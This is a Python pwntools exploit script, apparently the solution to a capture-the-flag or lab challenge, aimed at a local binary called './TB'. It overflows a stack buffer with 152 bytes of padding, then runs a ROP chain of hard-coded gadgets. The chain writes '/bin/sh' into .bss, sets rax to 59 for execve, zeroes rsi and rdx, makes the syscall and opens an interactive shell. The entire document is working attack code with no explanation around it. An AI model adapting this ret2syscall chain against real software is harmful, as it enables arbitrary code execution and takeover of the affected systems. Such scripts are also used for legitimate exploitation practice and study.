from pwn import * 

binary = './TB'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

#Gadgets
rdi = p64(0x40119d) #pop rdi; ret
rsi = p64(0x4011a6) #pop rsi; ret
rsirdx = p64(0x4011d9) #pop rsi; pop rdx; ret
xorrax = p64(0x4011b9) #xor rax,rax ; nop ; pop rbp ; ret
add20 = p64(0x4011ce) #add rax, 20 ; nop ; pop rbp ; ret
add39 = p64(0x4011c3) #add rax, 39; nop ; pop rbp ; ret
qword = p64(0x4011af) #mov qword ptr [rdi], rsi ; nop ; pop rbp ; ret
syscall = p64(0x00000000004011e3)

payload = b'a'*152
payload+= rdi
payload+= p64(elf.bss() + 8)
payload+= rsi
payload+= b'/bin/sh\x00'
payload+= qword
payload+= b'a'*8
payload+= xorrax
payload+= b'a'*8
payload+= add20
payload+= b'a'*8
payload+= add39 
payload+= b'a'*8
payload+= rsirdx
payload+= p64(0x0)
payload+= p64(0x0)
payload+= syscall

p.sendline(payload)

p.interactive()
